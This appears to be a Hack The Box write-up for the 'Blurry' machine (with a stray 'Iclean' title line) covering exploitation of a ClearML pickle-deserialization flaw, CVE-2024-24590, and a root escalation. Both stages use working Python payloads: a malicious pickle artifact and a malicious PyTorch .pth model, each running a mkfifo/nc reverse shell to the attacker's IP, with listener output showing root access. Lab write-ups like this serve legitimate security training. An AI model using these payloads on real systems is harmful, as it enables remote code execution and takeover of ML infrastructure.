# Iclean-HTB-walkthrough


# Blurry-writeup-HTB

# Exploration

Let's perform an nmap scan

```bash
nmap -sCV -A 10.10.11.19
```

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/ab3c53170f9d0aa3bac1610e503b2a95f3f6a0bd/Screenshot_2024-06-08_15_45_41.jpg)

We must add the subdomains:

```bash
sudo nano /etc/hosts 
```

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/ab3c53170f9d0aa3bac1610e503b2a95f3f6a0bd/Screenshot_2024-06-10_18_45_06_1.png)


Let's visit the web port app.blurry.htb that we discovered with the nmap scan


![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/52f9e337e18d4ba5b6940ca24728b4df07d5d6a1/Screenshot_2024-06-08_15_46_05.png)

Just by entering a username we can enter.

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/52f9e337e18d4ba5b6940ca24728b4df07d5d6a1/Screenshot_2024-06-08_16_28_06.png)


Investigate what CLEARML is, what it is for, how it works. 
I found a website that details the vulnerabilities.

[CVE-2024-24590](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/?source=post_page-----203ea31df0e3--------------------------------) 


# Exploitation configuration

According to what they explain, an attacker could create a pickle file containing arbitrary code and upload it as an artifact to a project via the API. When a user calls the get method within the Artifact class to download and load a file into memory, the pickle file is deserialized to their system and executes any arbitrary code it contains.

We need to configure it on our machine
![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-10_18_45_06.png)

```bash
pip install clearml
clearml-init
```
# Exploitation

We need a Python script that creates and uploads a malicious pickle file. 
When the file is executed, it will establish a reverse shell connection to our machine.

```bash
import pickle
import os
from clearml import Task, Logger

task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])

class MaliciousCode:
    def __reduce__(self):

        cmd = (
            "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "ip port" > /tmp/f"
        )
        return (os.system, (cmd,))

malicious_object = MaliciousCode()
pickle_filename = 'malicious_pickle.pkl'
with open(pickle_filename, 'wb') as f:
    pickle.dump(malicious_object, f)

print("Malicious pickle file with reverse shell created.")

task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")

print("Malicious pickle file uploaded as artifact.")
```

With the execution of the exploit, the artifact is loaded.
Then when the administrator checks it, you will get a shell on the listening port.

Listen on netcat
```bash
nc -lvnp <port>
```

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-14_04_16_58.png)

Run the exploit

```bash
python exploit.py
```
![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-14_04_19_25.png)

The exploit is uploaded to the web, runs and completes. after two minutes you get reverse shell in your terminal.
You may need to run the exploit several times to obtain the shell.

# The user flag
![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-13_17_54_22.png)

# Privilege escalation

Let's stabilize our shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")’    

export TERM=xterm 

stty raw -echo
```

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_04_23_09.png)

Let's check the ones we can run as root.
![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/db27863226c011535eb8e2eaaedb9a0add34e0bf/Screenshot_2024-06-14_04_23_38.png)

The jippity user can run the evaluate_model command with any file that has a .pth extension. Let's navigate to the /models/ directory to investigate further.

Installing the torch from pip will allow us to create a model.

The script I will use to create our malicious model:

```bash
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    # PyTorch's base class for all neural network modules
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    # Define how the data flows through the model
    def forward(self, demo): # Passes input through the linear layer.
        return self.dense(demo)
   
    # Overridden __reduce__ Method
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.x.x 6060 >/tmp/f"
        return os.system, (cmd,)

# Create an instance of the model
malicious_model = MaliciousModel()

# Save the model using torch.save
torch.save(malicious_model, 'demo.pth')
```

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_06_33_39.png)

```bash
jippity@blurry:~$ wget http://10.10.x.x/demo.pth
--2024-06-13 15:06:49--  http://10.10.x.x/demo.pth
```
# Root flag

![alt text](https://github.com/Milamagof/Blurry-writeup-HTB/blob/bec0d75683caded38a44eff5b2828f5188aa9013/Screenshot_2024-06-14_06_34_06.png)


```bash
nc -lvnp 6060
listening on [any] 6060 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.11.19] 57082
root
# cat /root/root.txt
```
